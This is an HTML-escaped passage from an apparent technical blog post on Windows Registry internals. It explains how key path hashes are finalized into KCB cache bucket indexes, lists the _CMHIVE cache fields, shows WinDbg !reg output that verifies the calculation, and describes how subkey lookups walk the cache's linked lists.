class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0x86a158ea&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The hash value calculated for each key, based on its path relative to the hive&amp;#39;s root, is stored in KCB.ConvKey.Hash.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consequently, the hash value for the standard system key HKLM\Software\Microsoft\Windows\CurrentVersion is 0x86a158ea.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Every&lt;/span&gt;&lt;span&gt;&amp;nbsp;hive has a directory of the KCBs within it, structured as a hashmap with a fixed number of buckets.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Each bucket comprises a linked list of the KCBs located there.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Internally, this directory is referred to as the &amp;quot;KCB cache&amp;quot; and is represented by the following two fields in the _CMHIVE structure:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x670&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbCacheTable&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_HASH_TABLE_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x678&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbCacheTableSize&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;KcbCacheTable is a pointer to a dynamically allocated array of _CM_KEY_HASH_TABLE_ENTRY structures, and KcbCacheTableSize specifies the number of buckets (i.e., the number of elements in the KcbCacheTable array).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In practice, the size of this KCB cache is &lt;/span&gt;&lt;span&gt;128&lt;/span&gt;&lt;span&gt;&amp;nbsp;buckets for the virtual \Registry hive, 512 for the vast majority of hives loaded in the system, and 1024 for two specific system hives: HKLM\Software and HKLM\System.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Given &lt;/span&gt;&lt;span&gt;a specific key with a name hash denoted as &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;ConvKey&lt;/span&gt;&lt;span&gt;, its KCB can be found in the cache bucket indexed as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;TmpHash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;101027&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(ConvKey&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(ConvKey&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CacheIndex&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(TmpHash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(TmpHash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(Hive-&amp;gt;KcbCacheTableSize&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c50&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c50&quot;&gt;// Kcb can be found in Hive-&amp;gt;KcbCacheTable[CacheIndex]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c50&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The operation of translating a key&amp;#39;s path hash to its KCB cache table index (excluding the modulo KcbCacheTableSize step) is called &amp;quot;finalization&amp;quot;. There&amp;#39;s even a WinDbg helper command that can perform this action for us: !reg finalize.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We can test it on the hash we calculated for the &amp;quot;Microsoft\Windows\CurrentVersion&amp;quot; path:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;finalize&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0x86a158ea&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Finalized&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Hash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Hash=0x86a158ea:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c4&quot;&gt;0xc2c65312&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;So, the finalized hash is 0xc2c65312, and since the KCB cache hive size of the SOFTWARE hive is 1024, this means that the index of the HKLM\Software\Microsoft\Windows\CurrentVersion key in the array will be the lowest 10 bits, or 0x312.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We can verify that our calculations are correct by finding the SOFTWARE hive in memory and listing the keys located in its individual buckets&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;hivelist&lt;/span&gt;&lt;/p&gt;ah
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ffffe10d2dad4000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;4da2000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ffffe10d2da78000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;3a6000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ffffe10d3489f000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ffffe10d2d8ff000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;emRoot\System32\Config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;openkeys&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ffffe10d2dad4000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Index&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;312:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;86a158ea&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kcb=ffffe10d2d576a30&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;cell=000a58e8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;f=00200000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;\REGISTRY\MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;As we can see, o&lt;/span&gt;&lt;span&gt;ur calculations have been proven to be accurate.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We could achieve a similar result with the !reg hashindex command&lt;/span&gt;&lt;span&gt;, which &lt;/span&gt;&lt;span&gt;takes the address of the _HHIVE&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;object and the ConvKey for a given key, and then prints out information about the corresponding bucket.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Within a single bucket in the KCB cache, all the KCBs are linked together in a singly-linked list &lt;/span&gt;&lt;span&gt;starting&lt;/span&gt;&lt;span&gt;&amp;nbsp;at the _CM_KEY_HASH_TABLE_ENTRY.Entry pointer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The &lt;/span&gt;&lt;span&gt;subsequent&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;elements are accessible through the _CM_KEY_HASH.NextHash field, which points to the KCB.KeyHash structure in the next KCB on the list.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A diagram of this data structure is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhs1mVeihbkGh07sygFQgByTbDezW9Mn2DKrqFOvnfA8ZcmJb7VDjevJ3pFF4fQ8gTi4BsmPwkZmoISPzFhe5Usgdgr-wj2BvFuAkXe5PYuzSK1TlHa1UTDqAoFV8A288SVDqrfxWddB90RKKOeCFiW6_I2fqvqGK4OGlITg5rsU5dHPfvCX1TiEhyphenhyphenoi_U/s1200/image6.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhs1mVeihbkGh07sygFQgByTbDezW9Mn2DKrqFOvnfA8ZcmJb7VDjevJ3pFF4fQ8gTi4BsmPwkZmoISPzFhe5Usgdgr-wj2BvFuAkXe5PYuzSK1TlHa1UTDqAoFV8A288SVDqrfxWddB90RKKOeCFiW6_I2fqvqGK4OGlITg5rsU5dHPfvCX1TiEhyphenhyphenoi_U/s1200/image6.png&quot; border=&quot;0&quot; alt=&quot;Diagram of the Windows Registry KCB cache structure. A pointer from the _CMHIVE structure references a _CM_KEY_HASH_TABLE_ENTRY array (hash table). Each entry/bucket in this array points to a singly-linked list of Key Control Blocks (KCBs). Within each KCB, the NextHash field points to the KeyHash structure of the subsequent KCB in the list, forming the chain.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram of the Windows Registry KCB cache structure. A pointer from the _CMHIVE structure references a _CM_KEY_HASH_TABLE_ENTRY array (hash table). Each entry/bucket in this array points to a singly-linked list of Key Control Blocks (KCBs). Within each KCB, the NextHash field points to the KeyHash structure of the subsequent KCB in the list, forming the chain.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Now that &lt;/span&gt;&lt;span&gt;we understand how the KCB objects are internally organized, let&amp;#39;s examine how name lookups are implemented.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Suppose we want to take a single step through a path and find the KCB of the next subkey based on its parent KCB and the key name.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The&lt;/span&gt;&lt;span&gt;&amp;nbsp;process is as follows (assuming the parent is not an exit node):&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_t96lsgedizsa-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span&gt;Get the pointer to the hive descriptor on which we are currently operating from ParentKcb-&amp;gt;KeyHive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span&gt;Calculate the hash of the subkey name based on its full path relative to the hive in which it is located.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span&gt;Calculate the appropriate index in the KCB cache based on the name hash and iterate through the linked list, comparing:&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol class=&quot;lst-kix_t96lsgedizsa-1 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;The hash of the key name.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;The pointer to the parent KCB.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;If both of the above match, perform a full comparison of the key name.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If it matches, we have found the subkey.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The&lt;/span&gt;&lt;span&gt;&amp;nbsp;process is particularly interesting because it is not based on directly iterating through the subkeys of a given key, but instead on iterating through all the keys in the particular cache bucket.&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;hanks to the use of hashing, the vast majority of checks of potential candidates for the sought-after subkey are reduced to a single comparison of two 32-bit numbers, making the whole process quite efficient. The performance is mostly dependent on the total number of keys in the hive and the number of hash collisions for the specific cache index.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
